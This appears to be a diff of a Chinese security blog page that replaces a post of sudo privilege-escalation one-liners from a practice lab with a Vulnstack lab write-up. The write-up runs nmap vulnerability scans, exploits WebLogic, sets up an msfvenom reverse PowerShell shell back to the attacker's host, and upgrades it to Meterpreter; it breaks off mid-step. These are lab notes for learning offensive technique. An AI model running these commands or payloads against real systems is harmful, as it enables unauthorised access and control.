@@ -16,36 +16,39 @@
   <meta name="author" content="Greed">
   <meta name="keywords" content="">
   
-    <meta name="description" content="challenge 1sudo提权，共有30关  各指令提权https:&#x2F;&#x2F;gtfobins.github.io&#x2F; apt-get提权 sudo -l 查看可执行文件，发现可以apt-get  执行以下命令提权 123sudo apt-get changelog apt!&#x2F;bin&#x2F;sh# viluhacker     arp越权读文件12f&#x3D;file_to_readsudo arp -v -f &amp;">
+    <meta name="description" content="[TOC] 靶场二环境123456攻击机：    kali靶机：    DC  Win2012(64)    PC  win7(32)    WEB winServer2008 R2(64)   靶机密码均为 1qaz@WSX ，其中WEB登不进，需要切换用户，直接 de1ay&#x2F;1qaz@WSX 登录，不要用 WEB域  需要手动开启WEB服务(上来直接扫漏洞无功而返就是没人告诉我要开服务…)，在">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hacksudoLPE">
-<meta property="og:url" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/index.html">
+<meta property="og:title" content="vulnstack靶场日记-2">
+<meta property="og:url" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/index.html">
 <meta property="og:site_name" content="Welcome to greed&#39; blog">
-<meta property="og:description" content="challenge 1sudo提权，共有30关  各指令提权https:&#x2F;&#x2F;gtfobins.github.io&#x2F; apt-get提权 sudo -l 查看可执行文件，发现可以apt-get  执行以下命令提权 123sudo apt-get changelog apt!&#x2F;bin&#x2F;sh# viluhacker     arp越权读文件12f&#x3D;file_to_readsudo arp -v -f &amp;">
+<meta property="og:description" content="[TOC] 靶场二环境123456攻击机：    kali靶机：    DC  Win2012(64)    PC  win7(32)    WEB winServer2008 R2(64)   靶机密码均为 1qaz@WSX ，其中WEB登不进，需要切换用户，直接 de1ay&#x2F;1qaz@WSX 登录，不要用 WEB域  需要手动开启WEB服务(上来直接扫漏洞无功而返就是没人告诉我要开服务…)，在">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/image-20231001144703604.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/image-20231001144538488.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/image-20231001145509793.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/image-20231001193142947.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/image-20231001193635774.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/image-20231002195530041.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/image-20231003140320108.png">
-<meta property="og:image" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/image-20231003140638303.png">
-<meta property="article:published_time" content="2023-11-26T04:08:46.000Z">
-<meta property="article:modified_time" content="2023-11-26T06:58:14.533Z">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204111818397.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204104109229.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204144913536.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204144934193.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204145042455.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204145927252.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204160314050.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204170125566.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204160842752.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205161854262.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205165146786.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205170345103.png">
+<meta property="article:published_time" content="2023-12-04T00:46:04.000Z">
+<meta property="article:modified_time" content="2023-12-06T07:03:55.540Z">
 <meta property="article:author" content="Greed">
 <meta property="article:tag" content="解题记录">
-<meta property="article:tag" content="vulnhub">
 <meta property="article:tag" content="学习">
-<meta property="article:tag" content="提权">
+<meta property="article:tag" content="vulnstack">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://just1greed.github.io/2023/11/26/hacksudoLPE/image-20231001144703604.png">
+<meta name="twitter:image" content="https://just1greed.github.io/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204111818397.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>hacksudoLPE - Welcome to greed&#39; blog</title>
+  <title>vulnstack靶场日记-2 - Welcome to greed&#39; blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -223,7 +226,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="hacksudoLPE"></span>
+            <span id="subtitle" data-typed-text="vulnstack靶场日记-2"></span>
           
         </div>
 
@@ -234,8 +237,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-11-26 12:08" pubdate>
-          2023年11月26日 中午
+        <time datetime="2023-12-04 08:46" pubdate>
+          2023年12月4日 早上
         </time>
       </span>
     
@@ -246,7 +249,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.7k 字
+          2.2k 字
         
       </span>
     
@@ -257,7 +260,7 @@
         
         
         
-          15 分钟
+          18 分钟
         
       </span>
     
@@ -302,12 +305,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">hacksudoLPE</h1>
+            <h1 id="seo-header">vulnstack靶场日记-2</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：14 天前
+                    本文最后更新于：4 天前
                   
                 
               </p>
@@ -315,135 +318,66 @@
             
               <div class="markdown-body">
                 
-                <h2 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h2><p>sudo提权，共有30关</p>
-<p><img src="/2023/11/26/hacksudoLPE/image-20231001144703604.png" srcset="/img/loading.gif" lazyload alt="image-20231001144703604"></p>
-<p>各指令提权<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
-<h3 id="apt-get提权"><a href="#apt-get提权" class="headerlink" title="apt-get提权"></a>apt-get提权</h3><ul>
-<li><p>sudo -l 查看可执行文件，发现可以apt-get</p>
+                <p>[TOC]</p>
+<h3 id="靶场二"><a href="#靶场二" class="headerlink" title="靶场二"></a>靶场二</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode">攻击机：<br>    kali<br>靶机：<br>    DC  Wi<span class="hljs-symbol">n2012</span><span class="hljs-comment">(64)</span><br>    PC  wi<span class="hljs-symbol">n7</span><span class="hljs-comment">(32)</span><br>    WEB wi<span class="hljs-symbol">nServer2008</span> R<span class="hljs-number">2</span><span class="hljs-comment">(64)</span><br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><p>靶机密码均为 <code>1qaz@WSX</code> ，其中WEB登不进，需要切换用户，直接 <code>de1ay/1qaz@WSX</code> 登录，不要用 <code>WEB域</code></p>
 </li>
-<li><p>执行以下命令提权</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> changelog apt<br>!/bin/sh<br><span class="hljs-comment"># viluhacker</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2023/11/26/hacksudoLPE/image-20231001144538488.png" srcset="/img/loading.gif" lazyload alt="image-20231001144538488"></p>
+<li><p>需要手动开启WEB服务(上来直接扫漏洞无功而返就是没人告诉我要开服务…)，在 <code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code> 下有一个 <code>startWeblogic</code> 的批处理，管理员身份运行它，管理员账号密码：<code>Administrator/1qaz@WSX</code> (注意大小写)</p>
 </li>
-</ul>
-<h3 id="arp越权读文件"><a href="#arp越权读文件" class="headerlink" title="arp越权读文件"></a>arp越权读文件</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">f</span>=file_to_read<br>sudo arp -v -f <span class="hljs-string">&quot;<span class="hljs-variable">$f</span>&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2023/11/26/hacksudoLPE/image-20231001145509793.png" srcset="/img/loading.gif" lazyload alt="image-20231001145509793"></p>
-<h3 id="awk提权"><a href="#awk提权" class="headerlink" title="awk提权"></a>awk提权</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span> &#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2023/11/26/hacksudoLPE/image-20231001193142947.png" srcset="/img/loading.gif" lazyload alt="image-20231001193142947"></p>
-<h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br>sudo <span class="hljs-built_in">base32</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base32</span> --decode<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2023/11/26/hacksudoLPE/image-20231001193635774.png" srcset="/img/loading.gif" lazyload alt="image-20231001193635774"></p>
-<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br>sudo <span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cat</span> /root/root.txt<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo comm <span class="hljs-regexp">/root/</span>root.txt <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 写</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DATA&quot;</span> | sudo <span class="hljs-built_in">cp</span> /dev/stdin /root/root.txt<br><span class="hljs-comment"># 读</span><br>sudo <span class="hljs-built_in">cp</span> /root/root.txt /dev/stdin<br></code></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cp</span> /bin/sh /bin/cp<br>sudo <span class="hljs-built_in">cp</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo curl file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;&quot;</span> -f1 /root/root.txt<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="dash"><a href="#dash" class="headerlink" title="dash"></a>dash</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo dash</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">date</span> -f /root/root.txt<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo diff --line-format=%L <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo ftp<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo gcc -<span class="hljs-keyword">wrapper</span> /bin/sh,-s .<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo gdb -nx -<span class="hljs-keyword">ex</span> <span class="hljs-string">&#x27;!sh&#x27;</span> -<span class="hljs-keyword">ex</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sudo</span> <span class="hljs-built_in">ip</span> -force -batch /root/root.txt<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>sudo pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo perl -e <span class="hljs-symbol">&#x27;exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>;&#x27;<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> view -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo wget -i <span class="hljs-regexp">/root/</span>root.txt<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> watch -x sh -c &#x27;reset; exec sh <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">0</span>&#x27;<br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">sudo xxd /root/root.txt <span class="hljs-string">| xxd -r</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -u)<br>sudo zip <span class="hljs-variable">$TF</span> /etc/hosts -T -TT <span class="hljs-string">&#x27;sh #&#x27;</span><br>sudo <span class="hljs-built_in">rm</span> <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h2><p>suid提权  共15关</p>
-<p><img src="/2023/11/26/hacksudoLPE/image-20231002195530041.png" srcset="/img/loading.gif" lazyload alt="image-20231002195530041"></p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">以下命令用来发现可提权的suid文件  <br><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br><span class="hljs-built_in">find</span> / -perm -4000 -type f -exec ls -al &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h2><p>特权 capabilities 滥用</p>
-<p><img src="/2023/11/26/hacksudoLPE/image-20231003140320108.png" srcset="/img/loading.gif" lazyload alt="image-20231003140320108"></p>
-<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">检查可执行文件获取的内核权限<br>getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="challenge-4"><a href="#challenge-4" class="headerlink" title="challenge 4"></a>challenge 4</h2><p>环境变量</p>
-<p><img src="/2023/11/26/hacksudoLPE/image-20231003140638303.png" srcset="/img/loading.gif" lazyload alt="image-20231003140638303"></p>
+<li><p>如果点了之后黑框闪一下就没，说明用的是普通用户权限，右键管理员运行</p>
+</li>
+</ol>
+<h4 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h4><p>靶机的ip有两个网段 <code>192.168.111.0/24</code>  和 <code>10.10.10.0/24</code> (注意顺序)，我们新开一个网卡VMnet3，配置为仅主机模式，网段为 <code>192.168.111.0/24</code> ，同时VM默认的仅主机模式网卡为 VMnet1，将VMnet3添加给kali和两个具有公网ip(192.168.111.xxx)的靶机</p>
+<h5 id="外网-VMnet3"><a href="#外网-VMnet3" class="headerlink" title="外网(VMnet3)"></a>外网(VMnet3)</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kali</span> <span class="hljs-number">192.168.111.128</span><br>PC   <span class="hljs-number">192.168.111.201</span><br>WEB  <span class="hljs-number">192.168.111.80</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="内网-仅主机模式-VMnet1"><a href="#内网-仅主机模式-VMnet1" class="headerlink" title="内网(仅主机模式 - VMnet1)"></a>内网(仅主机模式 - VMnet1)</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">DC</span>  <span class="hljs-number">10.10.10.10</span><br>PC  <span class="hljs-number">10.10.10.201</span><br>WEB <span class="hljs-number">10.10.10.80</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="连通性"><a href="#连通性" class="headerlink" title="连通性"></a>连通性</h5><p>PC 和 WEB 两台机子上有防火墙，所有机子都ping不同这两台</p>
+<p>内网都可以ping通 DC</p>
+<p>外网都可以ping通 kali</p>
+<h4 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h4><h5 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h5><p>nmap发现ip和开放端口</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap <span class="hljs-number">192.168.111.0</span>/<span class="hljs-number">24</span><br>nmap -<span class="hljs-keyword">A</span> -sS -sV -p- <span class="hljs-number">192.168.111.201</span><br>nmap -<span class="hljs-keyword">A</span> -sS -sV -p- <span class="hljs-number">192.168.111.80</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204111818397.png" srcset="/img/loading.gif" lazyload alt="image-20231204111818397"></p>
+<h5 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h5><p>利用nmap的漏扫插件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nmap <span class="hljs-attribute">--script</span>=vuln 192.168.111.80<br><span class="hljs-comment"># 发现永恒之蓝，利用失败</span><br><br>nmap <span class="hljs-attribute">--script</span>=vuln 192.168.111.201<br><span class="hljs-comment"># 同样有永恒之蓝，利用失败，猜测是开启了防火墙</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204104109229.png" srcset="/img/loading.gif" lazyload alt="image-20231204104109229"></p>
+<p>回到上一步，WEB服务器开了7001 <code>weblogic</code> 服务(废话，我亲手开的)，看看有没有漏洞可利用，这里使用 <a target="_blank" rel="noopener" href="https://github.com/0xn0ne/weblogicScanner">0xn0ne&#x2F;weblogicScanner</a> 和 <a target="_blank" rel="noopener" href="https://github.com/KimJun1010/WeblogicTool">KimJun1010&#x2F;WeblogicTool</a> ，前者用于探测，后者用于验证</p>
+<p>扫描结果<img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204144913536.png" srcset="/img/loading.gif" lazyload alt="image-20231204144913536"></p>
+<p>检测结果<img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204144934193.png" srcset="/img/loading.gif" lazyload alt="image-20231204144934193"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204145042455.png" srcset="/img/loading.gif" lazyload alt="image-20231204145042455"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204145927252.png" srcset="/img/loading.gif" lazyload alt="image-20231204145927252"></p>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p><code>cve_2016_0638</code> 和 <code>cve_2016_3510</code> 都可用来命令执行，弹个shell先</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># kali</span><br>msfvenom -p cmd/windows/reverse_powershell <span class="hljs-attribute">LHOST</span>=192.168.111.128 <span class="hljs-attribute">LPORT</span>=4444<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload cmd/windows/reverse_powershell<br><span class="hljs-built_in">set</span> LHOST 192.168.111.128<br>run<br></code></pre></td></tr></table></figure>
+
+<p>将生成的payload在工具命令框执行，拿到cmdshell，顺手看一眼systeminfo<img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204160314050.png" srcset="/img/loading.gif" lazyload alt="image-20231204160314050"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231204170125566.png" srcset="/img/loading.gif" lazyload alt="image-20231204170125566"></p>
+<p>① 可以拿去提权辅助工具搜漏洞</p>
+<p>② 发现内网地址</p>
+<h4 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h4><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>先把shell转为meterpreter_shell</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># shell</span><br>[ctrl + z] 当前会话挂后台<br><br><span class="hljs-comment"># msf</span><br>sessions 查看会话<span class="hljs-built_in">id</span><br>use post/multi/manage/shell_to_meterpreter<br><span class="hljs-keyword">set</span> session <span class="hljs-number">3</span>(shell的会话<span class="hljs-built_in">id</span>)<br><span class="hljs-built_in">run</span><br>sessions 查看会话<span class="hljs-built_in">id</span><br>sessions -i <span class="hljs-number">4</span>(新的会话<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment"># 